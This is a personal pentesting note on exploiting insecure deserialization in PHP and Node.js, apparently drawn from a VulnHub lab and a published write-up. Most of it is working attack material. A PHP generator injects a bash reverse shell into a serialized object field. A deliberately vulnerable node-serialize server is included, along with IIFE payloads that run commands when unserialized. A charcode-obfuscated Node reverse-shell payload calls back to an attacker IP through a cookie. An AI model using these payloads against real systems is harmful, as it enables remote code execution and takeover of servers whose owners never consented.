
# Definition

## What is the serialization of data

Mechanism that allow to transport [object](https://www.techtarget.com/searchapparchitecture/definition/object-oriented-programming-OOP) in a network

When we can manipulate the serialized object and isn't sanitized, we can change this to inject malicious code (like reverse shell)

---

# PHP deserialization attack

In the request we can see something like that:

````bash
obj=O%3a8%3a"pingTest"%3a1%3a{s%3a9%3a"ipAddress"%3bs%3a12%3a"192.168.1.39"%3b}%26ip%3d192.168.1.39
````

If we url-decoded:
````bash
obj=O:8:"pingTest":1:{s:9:"ipAddress";s:12:"192.168.1.39";}&ip=192.168.1.39
````

`O:8:"pingTest"` --> **O of Object**, The object have eight characters of length 
`s:9:"ipAddress"` --> s of **String** of nine characters


You can create a serialization data:

````php
<?php

class pingTest{
        public $ipdAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.1.39:443 0>&1'";
        public $isValid = True;
        public $output = "";
}

echo urlencode(serialize(new pingTest));

````

Execute the program with **php name.php; echo** and you can copy the text and put in burpsuite, in the correspondent field.

Example:

````bash
obj=O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A53%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.39%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D&ip=192.168.1.39
````

The ip is our attacker machine

----

# Node.js deserialization attack

Create the server with this code:

After run this you have to install this:
- node
- npm
- npm install express node-serialize cookie-parser

````js
//server.js

var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
````

To run this you have to put:

> node server.js


Now you can run your explorer and open localhost:3000 

When you refresh you see that the name change, if you intercept the request with burpsuite you can see that have a cookie that is url-encoded and in base64, you can decode this, change and encode again

### Serialization

In nodeJS the function for serialization is this:

````bash
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
````

You can see that there a try of command injection, but this don't work, they serialize the instruction

To obtain the serialize data you have to execute the script:

> node serialize.js

There are a concept that is **IIFE** (**I**mmediately **I**nvoked **F**unction **E**xpression) that allow to realize the call in the moment, this is add brackets() in the code, at the end of the variable y:

````js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
````

When you execute the script, now **the command is executed**

### Function to unserialize

````js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });}()"}'; //serialized data here
serialize.unserialize(payload);
````

You have to escape single quotes and line breaks

You have to add the **IIFE**, when the server deserealize the data, the command is going to execute thanks to the brackets of IIFE

And now, if you run the script, you can see how the command is executed:

> node unserialize.js


# Obtain a reverse shell

There are an script in python that allow you to generate a reverse shell. [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) 

> python2.7 nodejsshell attackerIP PORT

With the data obtainer you have to create a file with this:


````js
{"rce":"_$$ND_FUNC$$_function(){}()"}
````

Then introduce the data of reverse shell

````js
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,46,51,57,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}

````


It's **important**, the information must be send with **base64**

> cat data | base64 -w 0; echo

``-w 0`` --> All in the same line

Now, in cookie profile (in intruder), if you put all the data and put in listening mode in the port indicate (443 in this example)



---
# Resources

- https://www.vulnhub.com/entry/cereal-1,703/ (PHP)
- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ (NODE)

---
# Tags



#vulnerabilty #deserialization #php #node 